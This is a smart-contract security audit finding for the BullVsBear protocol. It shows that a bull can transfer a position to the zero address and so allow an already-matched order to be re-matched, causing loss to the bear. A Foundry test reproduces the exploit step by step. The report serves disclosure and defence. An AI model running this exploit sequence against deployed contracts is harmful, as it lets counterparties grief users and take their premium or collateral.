# [High-1] Any bull can override the already matched order with the new bear, resulting in a loss  for the previous bear instantly.

## Summary
Any bull can override the already matched order with the new bear, resulting in a loss  for the previous bear instantly.

## Vulnerability Detail
`BullVsBear` allows two parties to take the opposite position on any allowed collection.

Any one of Bull or Bear could be a maker and sign an order off-chain, and then the taker can match it onchain using `matchOrder()`.

Once an order is matched, ideally, it shouldn't be possible for any party to override it.

However, due to the combination of one incomplete check in `checkIsValidOrder` and the ability for any party to transfer their position to any address, **Bulls of any order can override the already matched order at the loss of the previous bear.**

`matchOrder` depends on `checkIsValidOrder` to detect if the given order is already matched, and `checkIsValidOrder` achieves so via the following check.
If `bulls` mapping for a particular `contractId` is set, it is assumed that the order is already matched.

```solidity
require(bulls[uint(orderHash)] == address(0), "ORDER_ALREADY_MATCHED");
```

**However, what if bull transfers the position to zero address?**

Now any new bear or bull itself can act as a bear and `matchOrder` again.

**Verification:**
```solidity
Inside Integration.t.sol

function testMatchingAndContractSettlement(BvbProtocol.Order memory order) public {
        vm.assume(order.premium <= type(uint).max / 1000);
        vm.assume(order.collateral <= type(uint).max / 1000);
        // Build the order
        order.validity = block.timestamp + 1 hours;
        order.expiry = block.timestamp + 1 days;
        order.nonce = 10;
        order.fee = bvb.fee();
        order.maker = bull;
        order.asset = address(usdc);
        order.collection = address(doodles);
        order.isBull = true;

        bytes32 orderHash = bvb.hashOrder(order);

        // Sign the order
        bytes memory signature = signOrderHash(bullPrivateKey, orderHash);

        // Calculate fees
        uint owedFeesBull = (order.collateral * fee) / 1000;
        uint owedFeesBear = (order.premium * fee) / 1000;

        // Give Bull and Bear enough USDC
        deal(address(usdc), bull, type(uint).max);
        deal(address(usdc), bear, type(uint).max);

        // Initial balances
        uint initialBalanceBull = usdc.balanceOf(bull);
        uint initialBalanceBear = usdc.balanceOf(bear);
        uint initialBalanceBvb = usdc.balanceOf(address(bvb));
        uint initialWithdrawableFees = bvb.withdrawableFees(address(usdc));

        // Approve Bvb to withdraw USDC from Bull and Bear
        vm.prank(bull);
        usdc.approve(address(bvb), type(uint).max);
        vm.prank(bear);
        usdc.approve(address(bvb), type(uint).max);

        // Maker (Bear) match with this order
        vm.prank(bear); 
        bvb.matchOrder(order, signature);
        vm.prank(bull);
        bvb.transferPosition(orderHash, true, address(0));
        vm.prank(bear);
        bvb.matchOrder(order, signature);

    }
   ```
## Impact : High
Bear would lose their position, even if the current market condition is in its favor.  They would lose only premium in the best case and premium + collateral in the worst case.

## Likelihood: Medium 

Any bull can execute this; there is no need for any special circumstances to occur.
However, the bull would lose its initial collateral as well.
There are two cases
1. Bull is winning: here, there is no clear incentive for the bull to execute this.
2. Bear is winning: here, anyway bull is going to lose its collateral; now, if the given NFT collection has become worthless, or if the bull doesn't want to lose the bet, the bull has a clear incentive to grieve the bear. 
Since this is a grieving vector, it's not a high likelihood, but because there is a clear way for one party to grieve another party from winning and end it in a draw and go one up, it could also happen, hence rating likelihood as a medium.
